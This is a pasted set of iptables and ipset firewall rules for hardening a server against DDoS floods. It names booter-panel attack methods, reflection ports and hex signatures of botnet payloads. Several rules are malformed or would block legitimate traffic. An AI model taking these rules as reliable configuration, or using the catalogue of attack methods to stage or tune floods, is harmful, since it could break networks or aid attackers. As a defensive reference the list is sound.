KILLALL PATCH
=============================
iptables -A INPUT -p tcp -m tcp --tcp-flags SYN,ACK SYN,ACK -j DROP
iptables -A INPUT -p tcp --tcp-flags ALL ALL -j DROP 
iptables -A INPUT -m state --state RELATED,ESTABLISHED -m limit --limit 10/sec --limit-burst 15 -j ACCEPT
iptables -A INPUT -p tcp --sport 80 --syn -m state --state NEW -m limit --limit 400/sec --limit-burst 15 -j ACCEPT 
iptables -A INPUT -p tcp -m connlimit --connlimit-above 150 -j DROP
iptables -A INPUT -p tcp --sport 443 --syn -m state --state NEW -m limit --limit 400/sec --limit-burst 15 -j ACCEPT 
iptables -FORWARD DROP





BYPASSES
=============================
iptables -A FORWARD -p 17 -m physdev –physdev-in vnet0 -m u32 –u32 "0&0xFFFF=2000:65535" -j DROP #Blocks Outgoing NTP/REFL 
iptables -I FORWARD -p udp –dport 123 -m string –algo bm –from 27 –to 28 –hex-string "|1700032A|" -j DROP #Block NTP Montlist 
iptables -A INPUT -p udp -m u32 --u32 "0>>22&0x3C@8&0xFF=42" #NTP Reflection Sequence Header Block 
iptables -A INPUT -p udp -m u32 --u32 "0>>22&0x3C@8&0xFF" #NTP Reflection Sequence Header Block 
iptables -A INPUT -p udp -m u32 --u32 "0>>22&0x3C@8" #NTP Reflection Sequence Header Block 
iptables -A INPUT -m string --algo bm --string "0x00" -j DROP 
iptables -A INPUT -m string --algo bm --string "0x000" -j DROP 
iptables -A INPUT -m string --algo bm --string "0x0000" -j DROP 
iptables -A INPUT -m string --algo bm --string "0x00000" -j DROP 
iptables -A INPUT -m string --algo bm --string "0x01" -j DROP 
iptables -A INPUT -m string --algo bm --string "0x001" -j DROP 
iptables -A INPUT -m string --algo bm --string "0x0001" -j DROP 
iptables -A INPUT -m string --algo bm --string "0x00001" -j DROP 
iptables -A INPUT -m string --algo bm --string "0x000001" -j DROP 
iptables -A INPUT -m string --algo bm --string "0x0000001" -j DROP 
iptables -A INPUT -m string --algo bm --string "0x00000001" -j DROP 
iptables -A INPUT -m string --algo bm --string "0x000000001" -j DROP
iptables -t raw -A PREROUTING -p udp -m length --length 65535 -j DROP #Malicious Botnet- UDP Payload / a UDP flood of length-65535 packets/4 
iptables -t raw -A PREROUTING -p udp -m length --length 60000 -j DROP #Malicious Botnet- UDP Payload / a UDP flood of length-60000 packets/4 
iptables -t raw -A PREROUTING -p udp -m length --length 30000 -j DROP #Malicious Botnet- UDP Payload / a UDP flood of length-30000 packets/4 
iptables -t raw -A PREROUTING -p udp -m length --length 10000 -j DROP #Malicious Botnet- UDP Payload / a UDP flood of length-10000 packets/4 
iptables -t raw -A PREROUTING -p udp -m length --length 4096 -j DROP #Malicious Botnet- UDP Payload / a UDP flood of length-4096 packets/4 
iptables -t raw -A PREROUTING -p udp -m length --length 1052 -j DROP #Malicious Botnet- UDP Payload / a UDP flood of length-1052 packets/4 
iptables -t raw -A PREROUTING -p udp -m length --length 1000 -j DROP #Malicious Botnet- UDP Payload / a UDP flood of length-1052 packets/4 
iptables -t raw -A PREROUTING -p udp -m length --length 912 -j DROP #Malicious Botnet-UDP Payload / a UDP flood of length-912 packets/4 
iptables -t raw -A PREROUTING -p udp -m length --length 540 -j DROP #Malicious Botnet-UDP Payload / a UDP flood of length-540 packets/3 
iptables -t raw -A PREROUTING -p udp -m length --length 55 -j DROP #Malicious Botnet-UDP Payload / a UDP flood of length-55 packets/1 
iptables -t raw -A PREROUTING -p udp -m length --length 38 -j DROP #Malicious Botnet-UDP Payload / UDP flood/37 
iptables -A PREROUTING -p udp -m length --length 0:28 -j DROP #Dropping Empty UDP Packets / Deemed Illegitimate Packets 
iptables -A INPUT -p udp -m u32 --u32 "2&0xFFFF=0x2:0x0100" #Generic-UDP-Header- Sequence 
iptables -A INPUT -p udp -m u32 --u32 "12&0xFFFFFF00=0xC0A80F00" -j DROP #Katura- UDP-Payload 
iptables -A INPUT -p tcp -syn -m length --length 52 u32 --u32 "12&0xFFFFFF00=0xc838" -j DROP #Mikey-Shit-TCP 
iptables -A INPUT -p udp -m length --length 28 -m string --algo bm --string "0x0010" -j DROP #Botnet UDP 
iptables -A INPUT -p udp -m length --length 28 -m string --algo bm --string "0x0000" -j DROP #Botnet UDP 
iptables -A INPUT -p tcp -m length --length 40 -m string --algo bm --string "0x0020" -j DROP 
iptables -A INPUT -p tcp -m length --length 40 -m string --algo bm --string "0x0c54" -j DROP #Botnet TCP 
iptables -A INPUT -p tcp -m length --length 40 -m string --algo bm --string "0x38d3" -j DROP #Botnet TCP 
iptables -A INPUT -p tcp -ack -m length --length 52 -m string --algo bm --string "0x912e" -m state --state ESTABLISHED -j DROP #Yubina-Kill-ACK 
iptables -A INPUT -p tcp -syn -m length --length 52 -m string --algo bm --string "0xc838" -m state --state ESTABLISHED -j DROP
iptables -t mangle -A PREROUTING -p tcp -m conntrack --ctstate NEW -m tcpmss ! --mss 536:65535 -j DROP
iptables -t mangle -A PREROUTING -p tcp ! --syn -m conntrack --ctstate NEW -j DROP
iptables -t mangle -A PREROUTING -m conntrack --ctstate INVALID -j DROP





REBIRTH PANEL PATCHES
=============================
# Dropping all common AMP source ports
iptables -t mangle -A PREROUTING -p udp -m multiport --sports3283,37810,7001,17185,3072,3702,32414,177,6881,5683,41794,2362,11211,53413,17,1900,10001,389,137,5351,502 -j DROP


# FN-LAG Patch | Method Patch | Found on Rebirth Panel by SelfRepNetis
# Port 37810 | Used by DVR IP Camera | UDP
iptables -t mangle -A PREROUTING -p udp --sport 37810 -j DROP


# OVH-KILL Patch | OVH Bypass Patch | Found on Rebirth Panel by SelfRepNetis
# Port 7001 | Used by WLS | UDP
iptables -t mangle -A PREROUTING -p udp --sport 7001 -j DROP
iptables -I INPUT -p udp -m length --length 100:140 -m string --string "nAFS" --algo kmp -j DROP


# OVH-SLAP Patch | OVH Bypass Patch | Found on Rebirth Panel by SelfRepNetis
# Port 17185 | Used by vxWorks//VoIP | UDP
iptables -t mangle -A PREROUTING -p udp --sport 17185 -j DROP


# OVH-DOWN & OVH-DOWNv2 Patch | OVH Bypass Patch | Found on Rebirth Panel by SelfRepNetis
# Port 3072 | Used by WSD | TCP or UDP
iptables -t mangle -A PREROUTING -p udp -m multiport --sports 3072,3702 -j DROP
iptables -t mangle -A PREROUTING -p tcp -m multiport --sports 3072,3702 -j DROP


# OVH-CRUSHv2 Patch | OVH Bypass Patch | Found on Rebirth Panel by SelfRepNetis
# Literally no difference in OVH-CRUSH and OVH-CRUSHv2, just posting a method and renaming it to v2
# Port 3283 | Used by ARD | UDP AMP
iptables -t mangle -A PREROUTING -p udp --sport 3283 -m length --length 1048 -j DROP


# OVH-CRUSH Patch | OVH Bypass Patch | Found on Rebirth Panel by SelfRepNetis
# Port 3283 | Used by ARD | UDP AMP
iptables -t mangle -A PREROUTING -p udp --sport 3283 -m length --length 1048 -j DROP


# NFO-LAG Patch | NFO Method Patch | Found on Rebirth Panel by SelfRepNetis
# Port 32414 | Used by PlexMediaServers | UDP
iptables -t mangle -A PREROUTING -p udp --sport 32414 -j DROP
# Port 177 | Used by XDMCP | UDP
iptables -t mangle -A PREROUTING -p udp --sport 177 -j DROP


# NFO-CLAP Patch | NFO Method Patch | Found on Rebirth Panel by SelfRepNetis
# Port 6881 | Used by BitTorrent | UDP
iptables -t mangle -A PREROUTING -p udp --sport 6881 -m length --length 320:330 -j DROP


# R6-LAG Patch | Method Patch | Found on Rebirth Panel by SelfRepNetis
# Port 32414 | Used by PlexMediaServers | UDP
iptables -t mangle -A PREROUTING -p udp -m length --length 280:300 --sport 32414 -j DROP





ADD THESE
=============================
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
iptables -A INPUT -p tcp -m tcp --tcp-flags FIN,ACK FIN -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags PSH,ACK PSH -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags ACK,URG URG -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags FIN,RST FIN,RST -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags FIN,SYN FIN,SYN -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags SYN,RST SYN,RST -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG FIN,SYN,RST,PSH,ACK,URG -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG NONE -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG FIN,PSH,URG -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG FIN,SYN,PSH,URG -j DROP
iptables -A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG FIN,SYN,RST,ACK,URG -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG NONE -j DROP 
iptables -t mangle -A PREROUTING -p tcp --tcp-flags FIN,SYN FIN,SYN -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags SYN,RST SYN,RST -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags FIN,RST FIN,RST -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags FIN,ACK FIN -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags ACK,URG URG -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags ACK,FIN FIN -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags ACK,PSH PSH -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags ALL ALL -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags ALL NONE -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags ALL FIN,PSH,URG -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags ALL SYN,FIN,PSH,URG -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP
iptables -t mangle -A PREROUTING -m conntrack --ctstate INVALID -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG NONE -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags FIN,SYN FIN,SYN -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags SYN,RST SYN,RST -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags FIN,RST FIN,RST -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags FIN,ACK FIN -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags ACK,URG URG -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags ACK,FIN FIN -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags ACK,PSH PSH -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags ALL ALL -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags ALL NONE -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags ALL FIN,PSH,URG -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags ALL SYN,FIN,PSH,URG -j DROP
iptables -t mangle -A PREROUTING -p tcp --tcp-flags ALL SYN,RST,ACK,FIN,URG -j DROP
iptables -t mangle -A PREROUTING -p udp --sport 37810 -j DROP # FN DROP
iptables -t mangle -A PREROUTING -p udp --sport 7001 -j DROP # OVH-KILL
iptables -I INPUT -p udp -m length --length 100:140 -m string --string "nAFS" --algo kmp -j DROP # OVH-KILL
iptables -I INPUT -p udp -m length --length 100:140 -m string --string "OpenAFS" --algo kmp -j DROP # OVH-KILL
iptables -t mangle -A PREROUTING -p udp --sport 17185 -j DROP # OVH-SLAP
iptables -t mangle -A PREROUTING -p udp -m multiport --sports 3072,3702 -j DROP # 
iptables -t mangle -A PREROUTING -p tcp -m multiport --sports 3072,3702 -j DROP # OVH-DOWNV2
iptables -t mangle -A PREROUTING -p udp --sport 3283 -m length --length 1048 -j DROP # OVH-CRUSHV2
iptables -t mangle -A PREROUTING -p udp --sport 3283 -m length --length 1048 -j DROP # OVH-CRUSHV1
iptables -t mangle -A PREROUTING -p udp --sport 177 -j DROP # NFO-LAG
iptables -t mangle -A PREROUTING -p udp --sport 6881 -m length --length 320:330 -j DROP # NFO-CLAP
iptables -t mangle -A PREROUTING -p udp -m length --length 280:300 --sport 32414 -j DROP # R6-LAG
iptables -t mangle -I PREROUTING -p tcp --tcp-flags SYN,ACK SYN,ACK --sport XMR DROP 
iptables -t mangle -I PREROUTING -p tcp --tcp-flags SYN,ACK 
iptables -t mangle -A PREROUTING -s 224.0.0.0/3 -j DROP
iptables -t mangle -A PREROUTING -s 169.254.0.0/16 -j DROP
iptables -t mangle -A PREROUTING -s 172.16.0.0/12 -j DROP
iptables -t mangle -A PREROUTING -s 192.0.2.0/24 -j DROP
iptables -t mangle -A PREROUTING -s 192.168.0.0/16 -j DROP
iptables -t mangle -A PREROUTING -s 0.0.0.0/8 -j DROP
iptables -t mangle -A PREROUTING -s 240.0.0.0/5 -j DROP
iptables -t mangle -A PREROUTING -s 127.0.0.0/8 ! -i lo -j DROP
iptables -t raw -A PREROUTING -s 224.0.0.0/3 -j DROP
iptables -t raw -A PREROUTING -s 169.254.0.0/16 -j DROP
iptables -t raw -A PREROUTING -s 172.16.0.0/12 -j DROP
iptables -t raw -A PREROUTING -s 192.0.2.0/24 -j DROP
iptables -t raw -A PREROUTING -s 192.168.0.0/16 -j DROP
iptables -A INPUT -s 10.0.0.0/8 -j DROP
iptables -A INPUT -s 169.254.0.0/16 -j DROP
iptables -A INPUT -s 172.16.0.0/12 -j DROP
iptables -A INPUT -i eth0 -s 127.0.0.0/8 -j DROP
iptables -A INPUT -s 224.0.0.0/4 -j DROP
iptables -A INPUT -d 224.0.0.0/4 -j DROP
iptables -A INPUT -s 240.0.0.0/5 -j DROP
iptables -A INPUT -d 240.0.0.0/5 -j DROP
iptables -A INPUT -s 0.0.0.0/8 -j DROP
iptables -A INPUT -d 0.0.0.0/8 -j DROP
iptables -A INPUT -d 239.255.255.0/24 -j DROP
iptables -A INPUT -d 255.255.255.255 -j DROP

iptables -A INPUT -m string --hex-string "|efbbbf30783030303230303031|" --algo bm --to 65535 -j DROP
iptables -A INPUT -m string --hex-string "|efbbbf307830303030303030303030433032313130|" --algo bm --to 65535 -j DROP
iptables -A INPUT -m string --hex-string "|efbbbfefbbbf307830303030303030303030433032313130|" --algo bm --to 65535 -j DROP
iptables -A INPUT -m string --hex-string "|efbbbfefbbbfefbbbf30783030363030453030|" --algo bm --to 65535 -j DROP
iptables -A INPUT -m string --hex-string "|efbbbfefbbbfefbbbfefbbbf30783030363030453038|" --algo bm --to 65535 -j DROP
iptables -A INPUT -m string --hex-string "|efbbbfefbbbfefbbbfefbbbfefbbbf30783030303230303031|" --algo bm --to 65535 -j DROP
iptables -A INPUT -m string --algo bm --hex-string "|c6 9a 0b c2 00 164|" -j DROP 
iptables -A INPUT -m string --algo bm --hex-string "|4d a3 c0 da 2a 84 0f da 50 184|" -j DROP 
iptables -A INPUT -m string --algo bm --hex-string "|34 89 5b 08 00 004|" -j DROP   
iptables -A INPUT -m string --algo bm --hex-string "|33 40 28 97 08 00 45 004|" -j DROP 
iptables -A INPUT -m string --algo bm --hex-string "|05 a0 9c a1 00 00 33 06 b1 39 33 0f 07 90 33 444|" -j DROP 
iptables -A INPUT -m string --algo bm --hex-string "|29 47 82 d3 04 51 bf a6 50 184|" -j DROP 
iptables -A INPUT -m string --algo bm --hex-string "|60 0a 33 8e fc 50 184|" -j DROP 
iptables -A INPUT -m string --algo bm --hex-string "|5d 4b 81 9d 0d d0 cab|" -j DROP
iptables -A INPUT -m string --algo bm --hex-string "|4b87bc1a68e6b8b35017|" -j DROP 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|5354445041434b4554|" -j DROP
iptables -A INPUT -m u32 --u32 "28&0x00000FF0=0xFEDFFFFF" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|535444|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|554450|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|54484953204953204546464543544956452e20594f552043414e4e4f542053554253494445204d5920444154412e|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|4b494c4c4b494c4c4b494c4c4b494c4c4b494c4c4b494c4c|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|4445415448444541544844454154484445415448425942314e415259|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|44444f5344444f5344444f53|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|4d4f354f4e354f4e354f4e354f4a354e4835563555|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|544350|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|4845584154544b212121212121|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|424f544e4554|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|424f4f5445524e4554|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|41545441434b|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|504f574552|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|6c6e6f6172656162756e63686f66736b696464696573|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|736b6964|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|736b69646e6574|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|4a554e4b2041545441434b|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|4a554e4b20464c4f4f44|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|484f4c442041545441434b|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|534554484946594f554445434f4445544849534f4e45594f554152455355434841464147484548454845|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|434e43|" -j DROP
iptables -A INPUT -p udp -m string --algo bm --hex-string "|5354445041532b4554|" -j DROP #Private Bypass Strings 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|535444|" -j DROP ##Private Bypass Strings 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|534450|" -j DROP ##Private Bypass Strings 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|54484953204953204546464543544956452e20594f552043414e4e4f54205355425349444520 4d5920444154412e|" -j DROP 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|4b494c4c4c4b494c4c4b494c4c4b494c4c4b494c4c4b494c4c|" -j DROP ##Private Bypass Strings 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|44454154484445415448444454154484445415448425942314e415259|" -j DROP ##Private Bypass Strings 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|44444f5344444f5344444r53|" -j DROP ##Private Bypass Strings 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|4d4f354f4e354f4e354f4e354f4a354e4835563555|" -j DROP ##Private Bypass Strings 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|544350|" -j DROP ##Private Bypass Strings 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|4845584154544b212121212121|" -j DROP ##Private Bypass Strings 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|424f544e4554|" -j DROP ##Private Bypass Strings 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|424f4f5445524e4554|" -j DROP ##Private Bypass Strings 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|41545441434b|" -j DROP ##Private Bypass Strings 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|504r574552|" -j DROP ##Private Bypass Strings 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|736b6964|" -j DROP ##Private Bypass Strings 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|6c6e6f6172656162756e6386f6673b694464696573|" -j DROP ##Private Bypass Strings 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|736b6954|" -j DROP ##Private Bypass Strings 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|736b69646e6574|" -j DROP ##Private Bypass Strings 
iptables -A INPUT -p udp -m string --algo bm --hex-string "|4a554e4b2041545441434b|" -j DROP ##Private Bypass Strings 
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|545333494e495431|' -j DROP
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|5045414345434f525053|' -j DROP
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|7065616365636f727073|' -j DROP
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|0cc47a82476c58ac|' -j DROP
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|7a7a7a7a7a|' -j DROP
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|ffffffff49|' -j DROP
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|ffffffff54|' -j DROP
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|ffffffff55|' -j DROP
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|ffffffff56|' -j DROP
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|ffffffff57|' -j DROP
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|ffffffff73|' -j DROP
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|fefefefefe|' -j DROP
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|5d5dfefefe|' -j DROP
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|5dfefefefe|' -j DROP
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|5dfefe|' -j DROP
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|4a4a4a4a4a|' -j DROP
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|fefea100c7|' -j DROP
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|4a28487066|' -j DROP
iptables -A PREROUTING -t raw -p udp -m multiport --dports 6672,3478,3479,3544,3474 -m string --algo kmp --hex-string '|52783c8292|' -j DROP
iptables -A PREROUTING -t raw -p udp -m string --algo kmp --hex-string '|326c633c3262636c26|' -j DROP





PORT SCANNING (you dont NEED it but if you want it then add it)
=============================
iptables -N port-scanning
iptables -A port-scanning -p tcp --tcp-flags SYN,ACK,FIN,RST RST -m limit --limit 1/s --limit-burst 2 -j RETURN
iptables -A port-scanning -j DROP
ipset create port_scanners hash:ip family inet hashsize 32768 maxelem 65536 timeout 600
ipset create scanned_ports hash:ip,port family inet hashsize 32768 maxelem 65536 timeout 60
iptables -A INPUT   -m recent --name portscan --rcheck --seconds 86400 -j DROP
iptables -A FORWARD -m recent --name portscan --rcheck --seconds 86400 -j DROP
iptables -A INPUT   -m recent --name portscan --remove
iptables -A FORWARD -m recent --name portscan --remove
iptables -A INPUT   -p tcp -m tcp --dport 139 -m recent --name portscan --set -j LOG --log-prefix "Portscan:"





ICMP PING OFF (you dont NEED it but if you want it then add it)
=============================
iptables -t mangle -A PREROUTING -p icmp -j DROP





RATELIMIT (you dont NEED it but if you want it then add it)
(p.s please tell people you have this turned on because people will claim they hit you).
=============================
RLIMIT="-m limit --limit 3/s --limit-burst 8"





UDP RANGES
==============================================================
apt install ipset
yum install ipset
ipset -N udprape nethash
ipset -q -A udprape 155.133.246.0/23
ipset -q -A udprape 155.133.248.0/24
ipset -q -A udprape 162.254.192.0/24
ipset -q -A udprape 162.254.193.0/24
ipset -q -A udprape 13.107.14.0/24
ipset -q -A udprape 52.112.0.0/14
ipset -q -A udprape 216.58.215.0/24
ipset -q -A udprape 216.239.36.0/24
ipset -q -A udprape 67.199.248.0/24
ipset -q -A udprape 66.249.64.0/20
ipset -q -A udprape 163.172.0.0/16
ipset -q -A udprape 50.22.130.64/27
ipset -q -A udprape 211.239.128.0/18
ipset -q -A udprape 217.72.192.0/20
ipset -q -A udprape 77.247.111.0/24
ipset -q -A udprape 37.49.231.0/24
ipset -q -A udprape 37.49.228.0/24
==============================================================

   ____ _     ___  _   _ ____  _____ _        _    ____  _____    ____      _    _   _  ____ _____ ____  
  / ___| |   / _ \| | | |  _ \|  ___| |      / \  |  _ \| ____|  |  _ \    / \  | \ | |/ ___| ____/ ___| 
 | |   | |  | | | | | | | | | | |_  | |     / _ \ | |_) |  _|    | |_) |  / _ \ |  \| | |  _|  _| \___ \ 
 | |___| |__| |_| | |_| | |_| |  _| | |___ / ___ \|  _ <| |___   |  _ <  / ___ \| |\  | |_| | |___ ___) |
  \____|_____\___/ \___/|____/|_|   |_____/_/   \_\_| \_\_____|  |_| \_\/_/   \_\_| \_|\____|_____|____/ 

CLOUDFLARE RANGES
==============================================================
ipset -N cloudflare nethash
ipset -q -A cloudflare 173.245.48.0/20
ipset -q -A cloudflare 103.21.244.0/22
ipset -q -A cloudflare 103.22.200.0/22
ipset -q -A cloudflare 103.31.4.0/22
ipset -q -A cloudflare 141.101.64.0/18
ipset -q -A cloudflare 108.162.192.0/18
ipset -q -A cloudflare 190.93.240.0/20
ipset -q -A cloudflare 188.114.96.0/20
ipset -q -A cloudflare 197.234.240.0/22
ipset -q -A cloudflare 198.41.128.0/17
ipset -q -A cloudflare 162.158.0.0/15
ipset -q -A cloudflare 104.16.0.0/12
ipset -q -A cloudflare 172.64.0.0/13
ipset -q -A cloudflare 131.0.72.0/22
==============================================================
==============================================================

   _____     ___   _    ____      _    _   _  ____ _____ ____  
  / _ \ \   / / | | |  |  _ \    / \  | \ | |/ ___| ____/ ___| 
 | | | \ \ / /| |_| |  | |_) |  / _ \ |  \| | |  _|  _| \___ \ 
 | |_| |\ V / |  _  |  |  _ <  / ___ \| |\  | |_| | |___ ___) |
  \___/  \_/  |_| |_|  |_| \_\/_/   \_\_| \_|\____|_____|____/

OVH_RAPE RANGES
==============================================================
-----------
(VALVE)
-----------
ipset -N ovh_rape hash:net 155.133.246.0/23
ipset -N ovh_rape hash:net 155.133.248.0/24
ipset -N ovh_rape hash:net 162.254.192.0/24
ipset -N ovh_rape hash:net 162.254.193.0/24

-----------
(GOOGLE)
-----------
ipset -N ovh_rape hash:net 216.58.215.0/24
ipset -N ovh_rape hash:net 216.239.36.0/24
ipset -N ovh_rape hash:net 67.199.248.0/24
ipset -N ovh_rape hash:net 66.249.64.0/20


-----------
(MICROSOFT)
-----------
ipset -N ovh_rape hash:net 52.112.0.0/14
ipset -N ovh_rape hash:net 13.107.14.0/24

==============================================================
OVH RANGES

iptables -t raw -A PREROUTING -p udp -s 62.210.0.0/16 ! --sport 53 -j DROP
iptables -t raw -A PREROUTING -p udp -s 195.154.0.0/16 ! --sport 53 -j DROP
iptables -t raw -A PREROUTING -p udp -s 212.129.0.0/18 ! --sport 53 -j DROP
iptables -t raw -A PREROUTING -p udp -s 62.4.0.0/19 ! --sport 53 -j DROP
iptables -t raw -A PREROUTING -p udp -s 212.83.128.0/19 ! --sport 53 -j DROP
iptables -t raw -A PREROUTING -p udp -s 212.83.160.0/19 ! --sport 53 -j DROP
iptables -t raw -A PREROUTING -p udp -s 212.47.224.0/19 ! --sport 53 -j DROP
iptables -t raw -A PREROUTING -p udp -s 63.172.0.0/16 ! --sport 53 -j DROP
iptables -t raw -A PREROUTING -p udp -s 51.15.0.0/16 ! --sport 53 -j DROP
iptables -t raw -A PREROUTING -p udp -s 151.115.0.0/16 ! --sport 53 -j DROP
iptables -t raw -A PREROUTING -p udp -s 51.158.0.0/15 ! --sport 53 -j DROP




OVH-NAT
-----------------------------------
iptables -t mangle -A PREROUTING -s 217.224.179.122 -j DROP
DROP LENGTH
iptables -A INPUT -p tcp -m length --length 52 -j DROP
BLOCK DESTINATION PORTS
iptables -A INPUT -p tcp -i eth0 ! -s 0.0.0.0/0 --dport 32992 -j DROP
BLOCK SOURCE PORT
iptables -t mangle -A PREROUTING -s 77.87.34.51 -j DROP
DROP LENGTH
iptables -A INPUT -p udp -m length --length 52 -j DROP
BLOCK DESTINATION PORTS
iptables -A INPUT -p udp -i eth0 ! -s 0.0.0.0/0 --dport 43193 -j DROP
BLOCK SOURCE PORT3
iptables -A OUTPUT -p udp --dport 14335 -j DROP

-----------------------------------
-----------------------------------
OVH-VIP
-----------------------------------
iptables -t mangle -A PREROUTING -s 46.201.226.158 -j DROP
DROP LENGTH
iptables -A INPUT -p udp -m length --length 740 -j DROP
BLOCK DESTINATION PORTS
iptables -A INPUT -p udp -i eth0 ! -s 0.0.0.0/0 --dport 10000 -j DROP
BLOCK SOURCE PORT
iptables -A OUTPUT -p tcp --dport 14335 -j DROP
iptables -t mangle -A PREROUTING -s 76.219.128.222 -j DROP
DROP LENGTH
iptables -A INPUT -p udp -m length --length 69 -j DROP
BLOCK DESTINATION PORTS
